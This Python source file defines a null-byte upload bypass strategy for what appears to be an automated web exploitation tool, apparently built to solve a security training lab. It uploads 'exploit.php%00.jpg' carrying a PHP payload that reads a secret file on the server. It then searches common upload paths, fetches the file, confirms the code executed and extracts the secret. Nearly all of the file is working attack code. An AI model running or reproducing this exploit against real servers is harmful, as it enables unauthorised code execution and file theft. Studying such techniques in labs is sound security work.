import re
from typing import Optional
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from strategies.base import Strategy, StrategyStatus
from models.observation import Observation, ObservationType, ConfidenceLevel


class NullByteUploadStrategy(Strategy):
    """
    Null byte injection bypass for extension filters
    
    Works on:
    - PHP < 8.0
    - Systems with weak file extension validation
    - Blacklist-based filters
    """
    
    name = "null_byte"
    description = "Bypass extension filters using null byte injection (filename.php%00.jpg)"
    confidence_gain = 0.9
    
    # Intelligence: What hypotheses this strategy targets
    targets_hypotheses = [
        "blacklist_filter",
        "weak_extension_check",
        "php_below_8",
        "extension_validation_active"
    ]
    
    
    tech_requirements = {
        "language": ["php"],
        "version_max": "8.0"
    }
    
    def __init__(self, uploader, fetcher, observer, base_url: str):
        """
        Initialize strategy
        
        Args:
            uploader: Uploader instance
            fetcher: Fetcher instance
            observer: Observer instance
            base_url: Base URL of target
        """
        self.uploader = uploader
        self.fetcher = fetcher
        self.observer = observer
        self.base_url = base_url.rstrip('/')
        
      
        self.file_paths = [
            "/files/avatars/{filename}",
            "/uploads/{filename}",
            "/upload/{filename}",
            "/files/{filename}",
            "/static/uploads/{filename}",
            "/media/uploads/{filename}",
            "/user/uploads/{filename}",
        ]
    
    def applicable(self, context) -> bool:
        """
        Check if this strategy is applicable
        
        Strategy is applicable if:
        - Blacklist filter hypothesis is likely
        - OR PHP version is below 8.0
        - OR extension validation was detected
        
        Args:
            context: AttackContext
            
        Returns:
            True if applicable
        """
 
        for hyp_name in self.targets_hypotheses:
            if hyp_name in context.hypotheses:
                if context.hypotheses[hyp_name].confidence > 0.5:
                    return True
        
        
        if context.tech_stack:
            if context.tech_stack.is_php() and context.tech_stack.is_php_below_8():
                return True
        
  
        return True
    
    def execute(self, context) -> StrategyStatus:
        """
        Execute null byte bypass attack
        
        Args:
            context: AttackContext
            
        Returns:
            StrategyStatus (SUCCESS, FAILURE, or INCONCLUSIVE)
        """
        print("      [*] Crafting null byte payload...")
        
       
        safe_ext = self._get_safe_extension(context)
        
   
        filename = f"exploit.php%00.{safe_ext}"
        
    
        payload = b"<?php echo file_get_contents('/home/carlos/secret'); ?>"
        
        print(f"      [*] Filename: {filename}")
        print(f"      [*] Payload size: {len(payload)} bytes")
        
   
        print("      [*] Uploading...")
        
        try:
            upload_response = self.uploader.upload(filename, payload)
        except Exception as e:
            print(f"      [!] Upload error: {e}")
            return StrategyStatus.FAILURE
       
        observations = self.observer.analyze_response(
            upload_response,
            context,
            {"phase": "upload", "filename": filename, "technique": "null_byte"}
        )
        
        for obs in observations:
            context.add_observation(obs)
        
       
        upload_success = any(
            obs.type == ObservationType.UPLOAD_SUCCESS 
            for obs in observations
        )
        
        if not upload_success:
            print(f"      [✗] Upload rejected (HTTP {upload_response.status_code})")
            return StrategyStatus.FAILURE
        
        print(f"      [✓] Upload accepted (HTTP {upload_response.status_code})")
        
  
        stored_filename = self._extract_filename(upload_response, observations)
        
        if not stored_filename:
            print("      [!] Could not determine stored filename")
   
            stored_filename = "exploit.php"
        
        print(f"      [*] Stored filename: {stored_filename}")
        
        
        file_url = self._find_uploaded_file(stored_filename)
        
        if not file_url:
            print("      [✗] File not accessible")
            return StrategyStatus.INCONCLUSIVE
        
        print(f"      [✓] File accessible at: {file_url}")
        
        print("      [*] Checking execution...")
        
        try:
            access_response = self.fetcher.get(file_url)
        except Exception as e:
            print(f"      [!] Access error: {e}")
            return StrategyStatus.FAILURE
        

        observations = self.observer.analyze_response(
            access_response,
            context,
            {"phase": "access", "url": file_url, "technique": "null_byte"}
        )
        
        for obs in observations:
            context.add_observation(obs)
        
        code_executed = any(
            obs.type == ObservationType.CODE_EXECUTION_DETECTED
            for obs in observations
        )
        
        if code_executed:
            print("      [✓] PHP CODE EXECUTED!")
        
            secret = access_response.text.strip()
            print(f"      [✓] Secret extracted: {secret[:50]}...")

            context.secret = secret

            success_obs = Observation(
                type=ObservationType.NULL_BYTE_SUCCESS,
                confidence=ConfidenceLevel.HIGH,
                evidence=[
                    f"Uploaded: {filename}",
                    f"Stored as: {stored_filename}",
                    f"Accessed: {file_url}",
                    "PHP execution confirmed",
                    f"Secret: {secret[:30]}..."
                ],
                uploaded_filename=filename,
                stored_filename=stored_filename,
                file_url=file_url,
                execution_confirmed=True
            )
            
            context.add_observation(success_obs)
            
            return StrategyStatus.SUCCESS
        
        else:
            print("      [✗] PHP not executed (source code visible)")
            return StrategyStatus.FAILURE
    
    def _get_safe_extension(self, context) -> str:
        """
        Get a safe extension that's likely allowed
        
        Args:
            context: AttackContext
            
        Returns:
            Safe extension (e.g., 'jpg')
        """

        if hasattr(context.capabilities, 'allowed_extensions'):
            if context.capabilities.allowed_extensions:
                return context.capabilities.allowed_extensions[0]
        

        return "jpg"
    
    def _extract_filename(self, response, observations: list) -> Optional[str]:
        """
        Extract the stored filename from response
        
        Args:
            response: HTTP response
            observations: List of observations from this response
            
        Returns:
            Filename or None
        """
        
        for obs in observations:
            if hasattr(obs, 'stored_filename') and obs.stored_filename:
                return obs.stored_filename
        
        
        body = response.text if hasattr(response, 'text') else str(response)
        
        
        patterns = [
            r'/files/avatars/([^"\s<>?]+)',
            r'/uploads/([^"\s<>?]+)',
            r'"filename"\s*:\s*"([^"]+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, body)
            if match:
                return match.group(1)
        
      
        if hasattr(response, 'headers'):
            location = response.headers.get('Location', '')
            if '/' in location:
                return location.split('/')[-1]
        
        return None
    
    def _find_uploaded_file(self, filename: str) -> Optional[str]:
        """
        Try to find the uploaded file at common paths
        
        Args:
            filename: Name of uploaded file
            
        Returns:
            URL where file is accessible, or None
        """
        for path_template in self.file_paths:
            url = self.base_url + path_template.format(filename=filename)
            
            try:
                response = self.fetcher.get(url)
                
                if response.status_code == 200:
                    return url
            except:
                continue
        
        return None